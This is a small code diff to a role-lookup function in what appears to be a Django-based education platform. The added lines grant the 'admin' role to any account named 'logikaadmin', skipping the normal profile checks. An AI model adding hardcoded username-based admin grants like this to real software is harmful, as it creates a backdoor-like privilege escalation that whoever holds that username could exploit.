@@ -4,6 +4,8 @@ from logika_general.models import RegionalManagerProfile, TerritorialManagerProf
 
 def get_user_role(user):
     try:
+        if user.username == "logikaadmin":
+            return "admin"
         if TeacherProfile.objects.filter(user=user).first():
             return "teacher"
         elif TutorProfile.objects.filter(user=user).first():
